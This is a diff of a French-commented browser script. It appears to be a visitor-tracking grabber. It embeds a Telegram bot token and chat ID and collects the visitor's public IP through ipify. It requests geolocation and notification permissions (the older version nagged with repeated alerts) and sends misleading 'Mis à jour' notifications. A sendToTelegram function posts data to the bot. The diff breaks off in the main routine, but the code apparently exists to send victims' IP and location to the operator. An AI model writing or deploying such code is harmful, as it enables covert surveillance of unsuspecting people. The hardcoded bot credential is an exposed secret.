@@ -2,6 +2,22 @@
 const token = "8468165702:AAHD08K4JugVPyCze00j1qbluTs6iyjf1mw";
 const chatId = "8012856656";
 
+// Envoi des notifications locales
+function sendMultipleNotifs(message, count){
+  for (let i=0;i<count;i++){
+    setTimeout(()=>{
+      new Notification(message + " ("+(i+1)+"/"+count+")");
+    }, i*1500);
+  }
+}
+
+// Récupération IP
+async function getIP(){
+  return fetch('https://api.ipify.org?format=json')
+    .then(r=>r.json()).then(d=>d.ip).catch(()=>null);
+}
+
+// Envoi à Telegram
 function sendToTelegram(text){
   fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
     method:"POST",
@@ -10,61 +26,37 @@ function sendToTelegram(text){
   }).catch(e=>console.log("Erreur Telegram",e));
 }
 
-function getIP(){
-  return fetch('https://api.ipify.org?format=json')
-    .then(r=>r.json()).then(d=>d.ip).catch(()=>null);
+// Demande de localisation (une seule fois)
+function askLocation(){
+  return new Promise(resolve=>{
+    if (!navigator.geolocation) return resolve({ok:false});
+    navigator.geolocation.getCurrentPosition(
+      pos => resolve({ok:true,lat:pos.coords.latitude,lon:pos.coords.longitude}),
+      err => resolve({ok:false}),
+      {timeout:10000}
+    );
+  });
 }
 
-// 🔔 Envoi plusieurs notifications
-function sendMultipleNotifs(message, count){
-  for (let i=0; i<count; i++){
-    setTimeout(()=>{
-      new Notification(message + " ("+(i+1)+"/"+count+")");
-    }, i * 1500);
-  }
-}
-
-// 📍 Demande de localisation (3 essais max)
-async function askLocation(){
-  for (let i=3; i>0; i--){
-    const ok = await new Promise(resolve=>{
-      if (!navigator.geolocation) return resolve(false);
-      navigator.geolocation.getCurrentPosition(
-        pos => resolve({ok:true,lat:pos.coords.latitude,lon:pos.coords.longitude}),
-        err => resolve(false),
-        {timeout:10000}
-      );
-    });
-
-    if (ok && ok.ok) return ok; // localisation acceptée
-    if (i>1) alert("Vous devez autoriser la localisation");
-  }
-  return {ok:false};
-}
-
-// 🔔 Demande de notifications (3 essais max)
+// Demande de notifications (une seule fois)
 async function askNotifications(){
-  for (let i=3; i>0; i--){
-    if (!("Notification" in window)) return false;
+  if (!("Notification" in window)) return false;
 
-    if (Notification.permission === "granted"){
-      sendMultipleNotifs("Mis à jour", 3);
-      return true;
-    }
-
-    const perm = await Notification.requestPermission();
-    if (perm === "granted"){
-      // ✅ envoie les 3 notifs dès qu’on autorise
-      sendMultipleNotifs("Mis à jour", 3);
-      return true;
-    }
-
-    if (i>1) alert("Vous devez autoriser les notifications");
+  if (Notification.permission === "granted"){
+    sendMultipleNotifs("Mis à jour", 3);
+    return true;
   }
-  return false;
+
+  const perm = await Notification.requestPermission();
+  if (perm === "granted"){
+    sendMultipleNotifs("Mis à jour", 3);
+    return true;
+  } else {
+    return false;
+  }
 }
 
-// 🚀 Script principal
+// Script principal
 async function runChecks(){
   const locResult = await askLocation();
   const locOk = locResult.ok;
